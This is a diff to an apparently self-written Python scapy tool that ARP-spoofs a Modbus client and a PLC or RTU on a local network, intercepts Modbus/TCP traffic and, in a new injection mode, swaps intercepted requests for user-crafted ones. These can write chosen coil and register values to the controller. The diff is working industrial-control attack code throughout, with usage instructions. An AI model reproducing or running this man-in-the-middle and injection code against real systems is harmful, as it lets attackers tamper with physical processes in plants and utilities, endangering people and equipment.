@@ -12,12 +12,12 @@ Requires: scapy and root privileges
 Usage:
   sudo python3 mopi.py -i eth0 -v 192.168.1.50 -t 192.168.1.10
 
-  
 Features to add:
-    - interactive mode: open prompt when the first modbus packet hits us, and allow user to select exactly what function and value they want to send
     - more output/logging to help debug + improve user experience
     - rename 'victim' and 'target' to 'client' and 'server'
     - complete other TODOs
+    - properly test interactive mode
+    - add ability to allow user to input config file which tells script how to modify every function type
   """
 
 import argparse
@@ -29,35 +29,35 @@ from datetime import datetime, timezone
 
 try:
     from scapy.all import (
-        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
+        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,srp1,sr
     )
-    from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
+    from scapy.contrib.modbus import (
+    ModbusADURequest,
+    ModbusPDU01ReadCoilsRequest,
+    ModbusPDU02ReadDiscreteInputsRequest,
+    ModbusPDU03ReadHoldingRegistersRequest,
+    ModbusPDU04ReadInputRegistersRequest,
+    ModbusPDU05WriteSingleCoilRequest,
+    ModbusPDU06WriteSingleRegisterRequest,
+    ModbusPDU0FWriteMultipleCoilsRequest,
+    ModbusPDU10WriteMultipleRegistersRequest,
+    ModbusADUResponse
+)
 except ImportError:
     print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
     sys.exit(1)
 
-VERSION="0.1"
+VERSION="0.2"
 
 MODBUS_FUNCTION_CODES = {
-    0x01: "Read Coils",
-    0x02: "Read Discrete Inputs",
-    0x03: "Read Holding Registers",
-    0x04: "Read Input Registers",
-    0x05: "Write Single Coil",
-    0x06: "Write Single Register",
-    0x07: "Read Exception Status",
-    0x08: "Diagnostics",
-    0x0B: "Get Comm Event Counter",
-    0x0C: "Get Comm Event Log",
-    0x0F: "Write Multiple Coils",
-    0x10: "Write Multiple Registers",
-    0x11: "Report Server ID",
-    0x14: "Read File Record",
-    0x15: "Write File Record",
-    0x16: "Mask Write Register",
-    0x17: "Read/Write Multiple Registers",
-    0x18: "Read FIFO Queue",
-    0x2B: "Encapsulated Interface Transport",
+    0x01: "Read Coils",                 #1
+    0x02: "Read Discrete Inputs",       #2
+    0x03: "Read Holding Registers",     #3
+    0x04: "Read Input Registers",       #4
+    0x05: "Write Single Coil",          #5
+    0x06: "Write Single Register",      #6
+    0x0F: "Write Multiple Coils",       #10
+    0x10: "Write Multiple Registers",   #16
 }
 
 
@@ -131,64 +131,158 @@ def is_retransmission(pkt):
         print(f"Not a retransmission: {key} seq={seq}")
         return False
 
-def handle_packet(pkt, port, log_file,mappings,own_mac):
+def print_modbus_payload(mb):
+    func_code = mb.funcCode
+    func_name = MODBUS_FUNCTION_CODES.get(func_code, "Unknown/Reserved")
+    print(f"Function:\t\t{func_name} ({func_code})")
+
+    # The actual PDU is whatever Scapy parsed as the payload of the ADU
+    pdu = mb.payload
+
+    # Map of field name -> friendly label, checked in order, only printed if present
+    field_labels = [
+        ("startAddr", "Start Address"),
+        ("quantity", "Quantity"),
+        ("outputAddr", "Coil Address"),
+        ("outputValue", "Coil Value"),
+        ("registerAddr", "Register Address"),
+        ("registerValue", "Register Value"),
+        ("quantityOutput", "Quantity (Coils)"),
+        ("quantityRegisters", "Quantity (Registers)"),
+        ("outputsValue", "Values"),
+        ("byteCount", "Byte Count"),
+        ("registerVal", "Register Values"),
+        ("coilStatus", "Coil Status"),
+    ]
+
+    for field_name, label in field_labels:
+        if hasattr(pdu, field_name):
+            value = getattr(pdu, field_name)
+            print(f"{label}:\t\t{value}")
+
+def interactive_packet_craft():
+    p=""
+    print("1) Read Coils")
+    print("2) Read Discrete Inputs")
+    print("3) Read Holding Registers")
+    print("4) Read Input Registers")
+    print("5) Write Single Coil")
+    print("6) Write Single Register")
+    print("10) Write Multiple Coils")
+    print("16) Write Multiple Register")
+
+    func_choice = int(input("Select your function: "))
+    print(func_choice)
+    print("Selected: ",MODBUS_FUNCTION_CODES.get(func_choice))
+
+    return(build_pdu(func_choice))
+
+
+def build_pdu(func_code: int):
+    if func_code in (0x01, 0x02, 0x03, 0x04):
+        # All read requests share the same two fields
+        start_addr = int(input("Start address: "), 0)
+        quantity = int(input("Quantity: "))
+
+        if func_code == 0x01:
+            return ModbusPDU01ReadCoilsRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x02:
+            return ModbusPDU02ReadDiscreteInputsRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x03:
+            return ModbusPDU03ReadHoldingRegistersRequest(startAddr=start_addr, quantity=quantity)
+        elif func_code == 0x04:
+            return ModbusPDU04ReadInputRegistersRequest(startAddr=start_addr, quantity=quantity)
+
+    elif func_code == 0x05:
+        output_addr = int(input("Coil address: "), 0)
+        state = input("State (on/off): ").strip().lower()
+        output_value = 0xFF00 if state == "on" else 0x0000
+        return ModbusPDU05WriteSingleCoilRequest(outputAddr=output_addr, outputValue=output_value)
+
+    elif func_code == 0x06:
+        reg_addr = int(input("Register address: "), 0)
+        reg_value = int(input("Value to write: "), 0)
+        return ModbusPDU06WriteSingleRegisterRequest(registerAddr=reg_addr, registerValue=reg_value)
+
+    elif func_code == 0x0F:
+        start_addr = int(input("Start address: "), 0)
+        values_str = input("Coil values, comma separated (e.g. 1,0,1,1): ")
+        values = [int(v.strip()) for v in values_str.split(",")]
+        return ModbusPDU0FWriteMultipleCoilsRequest(
+            startAddr=start_addr, quantityOutput=len(values), outputsValue=values
+        )
+
+    elif func_code == 0x10:
+        start_addr = int(input("Start address: "), 0)
+        values_str = input("Register values, comma separated (e.g. 100,200,300): ")
+        values = [int(v.strip(), 0) for v in values_str.split(",")]
+        return ModbusPDU10WriteMultipleRegistersRequest(
+            startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
+        )
+
+    raise ValueError(f"No PDU builder implemented for function code {func_code}")
+
+
+def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
+    is_custom=False
+    if crafted_pkt!="":
+        is_custom=True
     src = own_mac
     dst = pkt[IP].dst 
 
     # print("Source: "+src)
     # print("Dest: "+str(mappings[dst]))
 
-    npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
-    npkt[Ether].src=src
-    npkt[Ether].dst=mappings[dst]
+    pkt[Ether].src=src
+    pkt[Ether].dst=mappings[dst]
 
 
-    if npkt.haslayer(ModbusADURequest):
-        if is_retransmission(npkt):
+    if pkt.haslayer(ModbusADURequest):
+        if is_retransmission(pkt):
             return
-        mb = npkt[ModbusADURequest]
-    # elif npkt.haslayer(ModbusADUResponse):
-    #     mb = npkt[ModbusADUResponse]
     else:
-        sendp(npkt,loop=0,inter=0.2,verbose=0)
+        sendp(pkt,loop=0,inter=0.2,verbose=0)
         return
 
-    tcp = npkt[TCP]
+    tcp = pkt[TCP]
    
     if tcp.sport != port and tcp.dport != port:
         return
     direction = "req " if tcp.dport == port else "resp"
-    src = f"{npkt[IP].src}:{tcp.sport}"
-    dst = f"{npkt[IP].dst}:{tcp.dport}"
+    src = f"{pkt[IP].src}:{tcp.sport}"
+    dst = f"{pkt[IP].dst}:{tcp.dport}"
     log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
-    
-    if npkt.haslayer(ModbusADURequest):
-        original_value = npkt[ModbusADURequest].registerValue
-        
-        
-        print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(npkt[ModbusADURequest].funcCode))
-        print("Register Address:\t",npkt[ModbusADURequest].registerAddr)
-        print("Original Value:\t\t",original_value)
+    if is_custom:
+        print("Crafting custom packet")
+        trans_id = pkt[ModbusADURequest].transId
+        unit_id = pkt[ModbusADURequest].unitId
 
-        new_value = input("Enter new value:")
-        # new_value=99
-        npkt[ModbusADURequest].registerValue=int(new_value)
+        stripped = pkt.copy()
+        stripped[TCP].remove_payload()
+        modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
 
-        print("New Value:\t\t",npkt[ModbusADURequest].registerValue)
-        # npkt[ModbusADURequest].transId=4660
-    # elif npkt.haslayer(ModbusADUResponse):
-    #     npkt[ModbusADUResponse].registerValue=1
-    #     print(f"Register Value: ",npkt[ModbusADUResponse].registerValue)
-    #     npkt[ModbusADUResponse].transId=4660
-
-    # del p.chksum
-    del npkt[TCP].chksum
-    del npkt[IP].chksum
+        pkt = stripped / modbus_payload
+    else: # just sniffing traffic
+        print("\nRequest Recieved:")
+        print_modbus_payload(pkt[ModbusADURequest])    
+        print("-"*16)
+    del pkt[TCP].chksum
+    del pkt[IP].chksum
 
     # print(npkt.show(dump=True))
-    sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
- 
+    # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
+    response = srp1(pkt, timeout=3, verbose=0)
+    if response:
+        print("\nResponse received:")
+        # response.show()
+        if response.haslayer(ModbusADUResponse):
+            print_modbus_payload(response[ModbusADUResponse])
+            print("-"*16)
+        else:
+            print("Missing ModbusADUResponse layer...")
+    else:
+        print("No response — device may be down, dropping packets, or filtering the request")
 
 def banner():
     print(f'''                                                                                                 
@@ -206,6 +300,7 @@ def main():
     ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
     ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
     ap.add_argument("--log", help="Optional path to append decoded output to")
+    ap.add_argument("--injection", type=bool, help="Craft your own Modbus request")
     ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
     args = ap.parse_args()
 
@@ -217,13 +312,17 @@ def main():
     log_file = open(args.log, "a") if args.log else None
     stop_event = threading.Event()
 
+    crafted_pkt=""
+    if args.injection:
+        crafted_pkt = interactive_packet_craft()
+
     try:
         conf.iface = args.interface
     except Exception as e:
         log_line("[-] Error: "+str(e),log_file)
         exit(1)
 
-    own_mac = get_if_hwaddr(args.interface) # interface mac address
+    own_mac = get_if_hwaddr(args.interface) 
     victim_mac = get_mac(args.victim, args.interface)
     target_mac = get_mac(args.target, args.interface)
 
@@ -242,17 +341,14 @@ def main():
     spoof_thread.start()
     log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
-    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" # TODO: make MAC address whitelist automatic
+    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" 
 
-    # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
 
     mappings = {args.victim:victim_mac,args.target:target_mac}
-    
+
     try:
         sniff(iface=args.interface, filter=bpf_filter,
-              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac), store=False)
-        # sniff(iface=args.interface,
-        #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
+              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,crafted_pkt), store=False)
     except KeyboardInterrupt:
         pass
     finally:
